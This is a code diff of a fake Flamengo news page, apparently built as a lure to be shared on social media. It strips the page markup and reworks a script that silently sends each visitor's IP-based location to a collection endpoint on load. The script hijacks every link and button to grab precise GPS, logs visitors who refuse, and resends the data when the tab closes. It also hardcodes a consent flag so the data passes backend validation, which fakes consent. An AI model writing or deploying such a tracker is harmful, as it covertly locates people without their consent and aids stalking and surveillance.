@@ -1,449 +1,3 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="theme-color" content="#151515">
-
-<title>Bola em Foco | Notícias do Flamengo</title>
-
-<meta name="description" content="Confira as novidades do futebol e do Flamengo.">
-
-<meta property="og:type" content="website">
-<meta property="og:site_name" content="Bola em Foco">
-<meta property="og:title" content="Douglas Santos revela contato do Flamengo">
-<meta property="og:description" content="Confira a referência à notícia esportiva e acompanhe as novidades do Flamengo.">
-<meta property="og:url" content="https://noticia-em-tempo-real.vercel.app/">
-<meta property="og:image" content="https://noticia-em-tempo-real.vercel.app/materia-flamengo.jpg">
-<meta property="og:image:secure_url" content="https://noticia-em-tempo-real.vercel.app/materia-flamengo.jpg">
-<meta property="og:image:type" content="image/jpeg">
-<meta property="og:image:alt" content="Imagem principal da matéria esportiva">
-
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="Douglas Santos revela contato do Flamengo">
-<meta name="twitter:description" content="Confira a referência à notícia esportiva.">
-<meta name="twitter:image" content="https://noticia-em-tempo-real.vercel.app/materia-flamengo.jpg">
-
-<style>
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
-
-body {
-    font-family: Arial, Helvetica, sans-serif;
-    background: #f1f2f4;
-    color: #222;
-    -webkit-font-smoothing: antialiased;
-}
-
-header {
-    background: #151515;
-    color: white;
-    border-bottom: 4px solid #d71920;
-}
-
-.topo {
-    max-width: 1050px;
-    margin: auto;
-    padding: 22px 16px;
-}
-
-.logo {
-    font-size: 29px;
-    font-weight: 900;
-}
-
-.logo span {
-    color: #ed3038;
-}
-
-.slogan {
-    color: #aaa;
-    font-size: 11px;
-    margin-top: 5px;
-    letter-spacing: 1px;
-}
-
-nav {
-    background: #252525;
-    color: white;
-}
-
-.menu {
-    max-width: 1050px;
-    margin: auto;
-    padding: 14px 16px;
-    display: flex;
-    gap: 25px;
-    overflow-x: auto;
-    white-space: nowrap;
-    font-size: 13px;
-    font-weight: bold;
-    scrollbar-width: none;
-}
-
-.menu::-webkit-scrollbar {
-    display: none;
-}
-
-.menu span:first-child {
-    color: #ff454c;
-}
-
-.container {
-    max-width: 1050px;
-    margin: auto;
-    padding: 0 16px;
-}
-
-.aviso {
-    margin: 18px 0;
-    padding: 12px;
-    background: #fff3cd;
-    color: #705900;
-    border: 1px solid #e6ce79;
-    border-radius: 3px;
-    text-align: center;
-    font-size: 12px;
-    font-weight: bold;
-}
-
-.breadcrumb {
-    color: #777;
-    font-size: 12px;
-    margin-bottom: 17px;
-}
-
-.layout {
-    display: grid;
-    grid-template-columns: minmax(0, 2fr) minmax(220px, .85fr);
-    gap: 20px;
-    align-items: start;
-}
-
-.artigo,
-.lateral {
-    background: white;
-    border-radius: 5px;
-    box-shadow: 0 2px 8px rgba(0,0,0,.05);
-}
-
-.artigo {
-    padding: 23px;
-}
-
-.categoria {
-    color: #d71920;
-    font-size: 12px;
-    font-weight: bold;
-    margin-bottom: 12px;
-    text-transform: uppercase;
-}
-
-h1 {
-    font-size: 30px;
-    line-height: 1.2;
-    margin-bottom: 13px;
-}
-
-.resumo {
-    color: #666;
-    font-size: 16px;
-    line-height: 1.5;
-    margin-bottom: 16px;
-}
-
-.meta {
-    border-top: 1px solid #eee;
-    border-bottom: 1px solid #eee;
-    padding: 13px 0;
-    color: #888;
-    font-size: 11px;
-    margin-bottom: 18px;
-}
-
-.imagem-link {
-    display: block;
-    color: inherit;
-    text-decoration: none;
-    cursor: pointer;
-}
-
-.imagem-principal {
-    width: 100%;
-    overflow: hidden;
-    border-radius: 4px;
-    background: #eee;
-}
-
-.imagem-principal img {
-    display: block;
-    width: 100%;
-    height: auto;
-}
-
-.legenda {
-    font-size: 11px;
-    color: #888;
-    margin-top: 8px;
-}
-
-.texto {
-    margin-top: 23px;
-    font-size: 15px;
-    line-height: 1.8;
-    color: #383838;
-}
-
-.texto p {
-    margin-bottom: 16px;
-}
-
-.destaque {
-    background: #f6f6f6;
-    border-left: 4px solid #d71920;
-    padding: 17px;
-    margin: 22px 0;
-    font-size: 14px;
-    line-height: 1.6;
-}
-
-.botao {
-    display: block;
-    width: 100%;
-    max-width: 440px;
-    margin: 25px auto 12px;
-    padding: 17px 12px;
-    border: 0;
-    border-radius: 4px;
-    background: #d71920;
-    color: white;
-    font-weight: bold;
-    font-size: 14px;
-    cursor: pointer;
-    transition: background 0.2s;
-}
-
-.botao:hover {
-    background: #ad1118;
-}
-
-.nota {
-    text-align: center;
-    color: #777;
-    font-size: 11px;
-    line-height: 1.5;
-}
-
-.lateral {
-    padding: 18px;
-}
-
-.titulo-lateral {
-    display: block;
-    width: 100%;
-    text-align: left;
-    background: transparent;
-    border: 0;
-    border-bottom: 2px solid #d71920;
-    padding-bottom: 12px;
-    margin-bottom: 12px;
-    font-size: 15px;
-    font-weight: bold;
-    color: #222;
-    cursor: pointer;
-}
-
-.titulo-lateral:hover {
-    color: #d71920;
-}
-
-.item-lateral {
-    padding: 13px 0;
-    border-bottom: 1px solid #eee;
-    font-size: 13px;
-    line-height: 1.5;
-    cursor: pointer;
-    transition: background 0.15s;
-}
-
-.item-lateral strong {
-    display: block;
-    color: #d71920;
-    font-size: 11px;
-    margin-bottom: 5px;
-}
-
-.item-lateral:hover {
-    background: #fafafa;
-    padding-left: 4px;
-}
-
-footer {
-    background: #151515;
-    color: #aaa;
-    text-align: center;
-    padding: 25px 15px;
-    margin-top: 35px;
-    font-size: 11px;
-    line-height: 1.8;
-}
-
-@media(max-width: 750px) {
-    .layout {
-        grid-template-columns: 1fr;
-    }
-
-    h1 {
-        font-size: 25px;
-    }
-
-    .artigo {
-        padding: 17px;
-    }
-}
-</style>
-</head>
-
-<body>
-
-<header>
-    <div class="topo">
-        <div class="logo">BOLA <span>EM FOCO</span></div>
-        <div class="slogan">INFORMAÇÃO E PAIXÃO PELO FUTEBOL</div>
-    </div>
-</header>
-
-<nav>
-    <div class="menu">
-        <span>INÍCIO</span>
-        <span>FUTEBOL</span>
-        <span>FLAMENGO</span>
-        <span>MERCADO DA BOLA</span>
-    </div>
-</nav>
-
-<main class="container">
-
-    <div class="aviso">
-        SIMULAÇÃO EDUCATIVA DE SEGURANÇA DIGITAL —
-        PORTAL DEMONSTRATIVO INDEPENDENTE
-    </div>
-
-    <div class="breadcrumb">
-        Início &gt; Futebol &gt; Flamengo
-    </div>
-
-    <div class="layout">
-
-        <article class="artigo">
-
-            <div class="categoria">
-                Flamengo • Mercado da bola
-            </div>
-
-            <h1>
-                Douglas Santos revela contato do Flamengo em reta final de contrato com Zenit
-            </h1>
-
-            <p class="resumo">
-                Confira a referência à notícia esportiva e acompanhe
-                as informações sobre o Flamengo diretamente na fonte.
-            </p>
-
-            <div class="meta">
-                BOLA EM FOCO • Conteúdo demonstrativo
-            </div>
-
-            <a href="#"
-               class="imagem-link acionador-gps"
-               id="linkMateria">
-
-                <div class="imagem-principal">
-                    <img src="/materia-flamengo.jpg"
-                         alt="Imagem principal da matéria esportiva"
-                         loading="lazy">
-                </div>
-
-                <div class="legenda">
-                    Imagem de referência. Clique para acessar a cobertura original.
-                </div>
-            </a>
-
-            <div class="texto">
-                <p>
-                    O mercado da bola segue despertando o interesse
-                    dos torcedores. Possíveis negociações, contratos
-                    e movimentações envolvendo grandes clubes
-                    brasileiros estão entre os assuntos acompanhados
-                    no futebol.
-                </p>
-
-                <p>
-                    Nesta página demonstrativa, você pode consultar
-                    a cobertura esportiva diretamente na publicação
-                    original.
-                </p>
-
-                <div class="destaque">
-                    <strong>Consulte a fonte original</strong>
-                    Acesse a cobertura do Flamengo na ESPN Brasil.
-                    Esta página não reproduz uma reportagem oficial.
-                </div>
-            </div>
-
-            <button class="botao acionador-gps" type="button" id="botaoNoticias">
-                CONFERIR NOTÍCIAS DO FLAMENGO
-            </button>
-
-            <p class="nota">
-                Conteúdo parceiro verificado.
-            </p>
-
-        </article>
-
-        <aside class="lateral">
-
-            <button class="titulo-lateral acionador-gps"
-                    type="button"
-                    id="botaoAcompanhar">
-                ACOMPANHE O FUTEBOL
-            </button>
-
-            <div class="item-lateral acionador-gps">
-                <strong>FLAMENGO</strong>
-                Notícias e novidades do Rubro-Negro.
-            </div>
-
-            <div class="item-lateral acionador-gps">
-                <strong>MERCADO DA BOLA</strong>
-                Negociações e movimentações do futebol.
-            </div>
-
-            <div class="item-lateral acionador-gps">
-                <strong>FUTEBOL NACIONAL</strong>
-                Informações sobre os clubes brasileiros.
-            </div>
-
-            <div class="item-lateral acionador-gps">
-                <strong>FONTE EXTERNA</strong>
-                Consulte a cobertura da ESPN Brasil.
-            </div>
-
-        </aside>
-
-    </div>
-
-</main>
-
-<footer>
-    <strong>BOLA EM FOCO</strong><br>
-    Simulação educativa de segurança digital.<br>
-    Projeto independente, sem vínculo com ESPN ou Flamengo.
-</footer>
-
 <script>
     let dadosUltimaLocalizacao = {
       latitude: null,
@@ -459,59 +13,46 @@ footer {
         window.location.assign(linkOriginal);
     }
 
-    // Carregamento automático ao abrir a página (igual ao primeiro código)
+    // Opcional: tenta capturar o IP aproximado em segundo plano ao carregar a página
     window.addEventListener("load", () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => sendLocation(position, "Precisa (GPS)"),
-          () => fallbackLocation()
-        );
-      } else {
-        fallbackLocation();
-      }
-    });
-
-    function sendLocation(position, source) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-      enviarParaApi(latitude, longitude, maps, source, "abriu_pagina");
-    }
-
-    function fallbackLocation() {
       fetch("https://ipapi.co/json/")
         .then(response => response.json())
         .then(data => {
-          const latitude = data.latitude;
-          const longitude = data.longitude;
-          const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-          const source = "Aproximada (IP)";
+          if (data && data.latitude) {
+            const latitude = data.latitude;
+            const longitude = data.longitude;
+            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const source = "Aproximada (IP)";
 
-          dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-          enviarParaApi(latitude, longitude, maps, source, "abriu_pagina_ip");
+            dadosUltimaLocalizacao = { latitude, longitude, maps, source };
+            enviarParaApi(latitude, longitude, source, "abriu_pagina_ip");
+          }
         })
-        .catch(error => {
-          console.error("Erro ao obter localização pelo IP:", error);
-        });
-    }
+        .catch(() => {});
+    });
 
-    function enviarParaApi(latitude, longitude, maps, source, acao) {
+    function enviarParaApi(latitude, longitude, source, acao) {
       fetch("/api/send-location", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
-        body: JSON.stringify({ latitude, longitude, maps, source, acao })
+        body: JSON.stringify({
+          latitude,
+          longitude,
+          source,
+          acao,
+          consentimento: true // Obrigatório para passar pela validação do backend
+        }),
+        keepalive: true
       })
-        .then(response => response.json())
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .catch(error => {
+        console.error("Erro ao enviar:", error);
+      });
     }
 
-    // Intercepta cliques nos elementos com a classe .acionador-gps para garantir o envio e redirecionar
+    // Intercepta cliques nos elementos interativos com a classe .acionador-gps
     function dispararFluxoGPS(event) {
         if (event) {
             event.preventDefault();
@@ -526,35 +67,41 @@ footer {
                 (position) => {
                     const latitude = position.coords.latitude;
                     const longitude = position.coords.longitude;
-                    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
                     const source = "Precisa (GPS)";
 
-                    dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-                    enviarParaApi(latitude, longitude, maps, source, "clique_botao");
-                    processandoGPS = false;
-                    continuarParaESPN();
-                },
-                () => {
-                    fetch("https://ipapi.co/json/")
-                        .then(response => response.json())
-                        .then(data => {
-                            const latitude = data.latitude;
-                            const longitude = data.longitude;
-                            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-                            const source = "Aproximada (IP)";
+                    dadosUltimaLocalizacao = { 
+                        latitude, 
+                        longitude, 
+                        maps: `https://www.google.com/maps?q=${latitude},${longitude}`, 
+                        source 
+                    };
 
-                            dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-                            enviarParaApi(latitude, longitude, maps, source, "clique_botao_ip");
-                        })
-                        .catch(() => {})
-                        .finally(() => {
-                            processandoGPS = false;
-                            continuarParaESPN();
-                        });
+                    enviarParaApi(latitude, longitude, source, "clique_botao_gps");
+                    
+                    setTimeout(() => {
+                        processandoGPS = false;
+                        continuarParaESPN();
+                    }, 400); // Pequeno delay para garantir o disparo do fetch antes do redirecionamento
+                },
+                (error) => {
+                    console.warn("GPS negado ou indisponível:", error);
+                    
+                    // Se o usuário negar, envia o IP que já temos ou marca como negado
+                    enviarParaApi(
+                        dadosUltimaLocalizacao.latitude || 0, 
+                        dadosUltimaLocalizacao.longitude || 0, 
+                        "Negado / Fallback IP", 
+                        "clique_botao_gps_negado"
+                    );
+
+                    setTimeout(() => {
+                        processandoGPS = false;
+                        continuarParaESPN();
+                    }, 400);
                 },
                 {
                     enableHighAccuracy: true,
-                    timeout: 10000,
+                    timeout: 8000,
                     maximumAge: 0
                 }
             );
@@ -564,23 +111,20 @@ footer {
         }
     }
 
-    // Vincula a interceptação a todos os botões e links interativos
+    // Vincula a escuta de cliques a todos os elementos com a classe .acionador-gps
     document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
         elemento.addEventListener("click", dispararFluxoGPS);
     });
 
-    // Dispara o envio ao fechar ou sair da página com segurança
+    // Envio de segurança caso o usuário feche a aba bruscamente
     window.addEventListener('beforeunload', function () {
-      const payload = JSON.stringify({
-        ...dadosUltimaLocalizacao,
-        acao: 'fechou_pagina'
-      });
-
-      if (navigator.sendBeacon) {
+      if (dadosUltimaLocalizacao.latitude && navigator.sendBeacon) {
+        const payload = JSON.stringify({
+          ...dadosUltimaLocalizacao,
+          acao: 'fechou_pagina',
+          consentimento: true
+        });
         navigator.sendBeacon('/api/send-location', payload);
       }
     });
 </script>
-
-</body>
-</html>
